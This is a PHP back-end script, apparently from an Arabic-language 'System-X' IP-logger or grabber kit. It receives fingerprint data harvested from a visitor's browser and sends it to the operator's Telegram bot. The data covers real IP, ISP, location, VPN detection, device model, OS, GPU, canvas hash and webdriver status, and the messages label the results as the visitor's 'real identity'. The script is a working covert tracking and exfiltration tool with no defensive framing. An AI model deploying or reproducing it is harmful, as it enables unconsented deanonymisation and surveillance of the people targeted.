<?php
ignore_user_abort(true);
require_once 'config.php';
require_once 'telegram.php';

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if ($d) {
    $ip = $d['net']['ip'] ?? $_SERVER['REMOTE_ADDR'];
    $isp = $d['net']['isp'] ?? "Unknown";
    $loc = isset($d['net']['city']) ? $d['net']['city'] . ", " . $d['net']['country'] : "Unknown";
    $vpn = isset($d['net']['vpn']) ? ($d['net']['vpn'] ? "نعم 🔴" : "لا 🟢") : "غير مكتشف";
    
    // تحديد الموديل والنسخة
    $finalModel = !empty($d['realModel']) ? $d['realModel'] : "Hidden";
    $finalOS = !empty($d['realOS']) ? $d['realOS'] : "Unknown (Hidden)";

    $msg = "🚀 <b>تقرير فحص System-X الجديد</b>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "👤 <b>الهوية الحقيقية:</b>\n";
    $msg .= "• الموديل: <code>$finalModel</code>\n";
    $msg .= "• إصدار النظام: <code>$finalOS</code>\n";
    $msg .= "• الـ IP الحقيقي: <code>$ip</code>\n\n";

    $msg .= "🌍 <b>استخبارات الشبكة:</b>\n";
    $msg .= "• المزود: <code>$isp</code>\n";
    $msg .= "• الموقع: <code>$loc</code>\n";
    $msg .= "• الـ VPN: <b>$vpn</b>\n\n";

    $msg .= "🖼️ <b>الشاشة والعرض:</b>\n";
    $msg .= "• الدقة (Physical): <code>" . $d['physRes'] . "</code>\n";
    $msg .= "• الـ DPR: <code>" . $d['dpr'] . "</code> | لمس: <code>" . $d['touch'] . "</code>\n\n";

    $msg .= "🎮 <b>كارت الشاشة (GPU):</b>\n";
    $msg .= "• Renderer: <code>" . ($d['gpu_renderer'] ?? 'N/A') . "</code>\n";
    $msg .= "• Vendor: <code>" . ($d['gpu_vendor'] ?? 'N/A') . "</code>\n\n";

    $msg .= "⚙️ <b>المواصفات والبيئة:</b>\n";
    $msg .= "• معالج: <code>" . $d['cores'] . "</code> | رام: <code>" . $d['ram'] . " GB</code>\n";
    $msg .= "• بطارية: <code>" . ($d['bat'] ?? 'N/A') . "</code>\n";
    $msg .= "• اللغة: <code>" . $d['lang'] . "</code>\n\n";

    $msg .= "🔍 <b>التتبع وكشف البوت:</b>\n";
    $msg .= "• بصمة الكانفاس: <code>..." . ($d['canvas_hash'] ?? 'N/A') . "</code>\n";
    $msg .= "• Math Hash: <code>" . $d['math'] . "</code>\n";
    $msg .= "• WebDriver: <b>" . $d['webdriver'] . "</b>\n\n";

    $msg .= "🌐 <b>UserAgent:</b>\n";
    $msg .= "<code>" . $d['ua'] . "</code>\n\n";
    
    $msg .= "—\n";
    $msg .= "👨‍💻 <b>Dev: @" . DEV_USERNAME . "</b>";

    sendTelegramMessage($msg);
}
?>
